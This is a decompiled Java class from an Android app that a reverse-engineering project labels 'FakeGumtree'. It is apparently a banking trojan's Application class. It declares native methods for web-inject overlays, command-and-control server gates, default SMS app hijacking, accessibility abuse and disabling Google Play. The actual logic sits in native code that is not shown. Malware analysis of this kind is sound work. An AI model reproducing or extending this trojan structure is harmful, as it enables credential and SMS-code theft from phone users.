package com.gumsis;

import android.annotation.SuppressLint;
import android.app.Application;
import android.content.Context;
import android.os.Handler;
import com.gumsis.wb.WITools;
import com.gumsis.wb.WITools.Inj;
import java.util.List;

public class Realtalk
  extends Application
{
  public static volatile Context applicationContext;
  public static volatile Handler applicationHandler;
  public static volatile List<WITools.Inj> injWI;
  @SuppressLint({"StaticFieldLeak"})
  public static volatile Realtalk instance;
  
  static
  {
    System.loadLibrary("realtalk-jni");
  }
  
  public static native String changeWEBInjJSONbyPkg(String paramString);
  
  public static native String getAddDevicePackageFromJNI();
  
  public static native String getDefSmsClPackage(Context paramContext);
  
  public static native String getNextServerGate(Context paramContext);
  
  public static native int getPingCounts(Context paramContext);
  
  public static native long getPreviousRid(Context paramContext);
  
  public static native String getPsuedoID(Context paramContext);
  
  public static native String getSPackage();
  
  public static native String getServerGate(Context paramContext);
  
  public static native String getSettingsPackageFromJNI();
  
  public static native String getStartWebUrl();
  
  public static native long getTimeStamp(Context paramContext);
  
  public static native String getWEBInjectUrl(String paramString);
  
  public static native int getWFCounts(Context paramContext);
  
  public static native String getWriteInjJSON(Context paramContext);
  
  public static native String getXiaomiSettingsPackageFromJNI();
  
  public static native boolean hasNotCurPackage(String paramString);
  
  public static native boolean isCurPackage(String paramString);
  
  public static native boolean isCurPackageMinimize(String paramString);
  
  public static native boolean isDisS(Context paramContext);
  
  public static native boolean isDisableGp(Context paramContext);
  
  public static native boolean isHardMode(Context paramContext);
  
  public static native boolean isPlaySound(Context paramContext);
  
  public static native boolean isStartAccess(Context paramContext);
  
  public static native void parseWEBInjJson(String paramString);
  
  public static native void setDefSmsClPackage(Context paramContext, String paramString);
  
  public static native void setDisS(Context paramContext, boolean paramBoolean);
  
  public static native void setDisableGp(Context paramContext, boolean paramBoolean);
  
  public static native void setHardMode(Context paramContext, boolean paramBoolean);
  
  public static native void setPingCounts(Context paramContext, int paramInt);
  
  public static native void setPlaySound(Context paramContext, boolean paramBoolean);
  
  public static native void setPreviousRid(Context paramContext, long paramLong);
  
  public static native void setPsuedoID(Context paramContext, String paramString);
  
  public static native void setServerGate(Context paramContext, String paramString);
  
  public static native void setStartAccess(Context paramContext, boolean paramBoolean);
  
  public static native void setTimeStamp(Context paramContext, long paramLong);
  
  public static native void setWFCounts(Context paramContext, int paramInt);
  
  public static native void setWriteInjJSON(Context paramContext, String paramString);
  
  public void onCreate()
  {
    super.onCreate();
    instance = this;
    applicationContext = getApplicationContext();
    applicationHandler = new Handler(applicationContext.getMainLooper());
    injWI = WITools.parseWEBInjJson(getWriteInjJSON(this));
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/Realtalk.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */